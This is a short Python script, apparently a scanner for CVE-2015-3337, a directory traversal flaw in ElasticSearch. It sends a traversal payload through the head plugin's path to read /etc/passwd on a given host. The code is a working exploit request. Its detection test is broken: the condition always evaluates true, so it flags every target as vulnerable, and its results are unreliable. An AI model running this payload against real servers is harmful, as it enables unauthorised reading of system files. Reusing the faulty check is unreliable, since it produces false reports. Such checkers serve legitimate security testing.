"""
@Author: exiashow
@File: es_dir_traversal.py
@Date: 2024/2/29 17:17
@Desc: CVE-2015-3337, ElasticSearch directory traversal
"""

import sys
import requests


class ElasticSearchDirTraversal:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = ":9200/_plugin/head/../../../../../../../../../etc/passwd"
        final_url = self.url + payload

        conn = requests.get(final_url)

        try:
            if "root" or "nologin" in conn.text:
                return "[Warning] Elasticsearch vulnerability discovered: CVE-2015-3337"
            else:
                None
        except Exception as e:
            return None

if __name__ == "__main__":
    fallingSword = ElasticSearchDirTraversal(sys.argv[1])
    print(fallingSword.run())